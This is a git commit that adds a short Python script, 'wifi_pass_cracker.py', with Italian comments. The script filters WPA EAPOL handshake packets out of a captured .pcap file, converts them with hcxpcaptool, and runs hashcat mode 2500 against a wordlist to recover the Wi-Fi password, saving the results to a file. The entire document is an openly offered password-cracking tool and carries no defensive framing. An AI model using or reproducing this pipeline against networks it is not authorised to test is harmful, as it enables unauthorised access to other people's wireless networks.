f5202d449acad6c11cafb25df01eba4e6e94f712
47LeCoste <82815207+grugnoymeme@users.noreply.github.com>
2023-05-03 22:56:38 +0200

    Add files via upload

---
+++ wifi_pass_cracker.py
@@ -0,0 +1,20 @@
+import pyshark
+import subprocess
+
+# Seleziona il file .pcap di input
+input_file = input("Inserisci il nome del file .pcap di input: ")
+
+# Crea un nuovo file .pcap contenente solo i pacchetti EAPOL
+output_file = "eapol.pcap"
+capture = pyshark.FileCapture(input_file, display_filter="eapol", output_file=output_file)
+
+# Converte il file .pcap in .hccapx
+hccapx_file = "eapol.hccapx"
+subprocess.run(["hcxpcaptool", "-o", hccapx_file, output_file])
+
+# Importa il file .hccapx in hashcat e salva i risultati su un file "risultati.txt"
+results_file = "risultati.txt"
+subprocess.run(["hashcat", "-m", "2500", hccapx_file, "wordlist.txt", "-o", results_file])
+
+# Stampa un messaggio di conferma
+print("I risultati sono stati scritti su " + results_file)
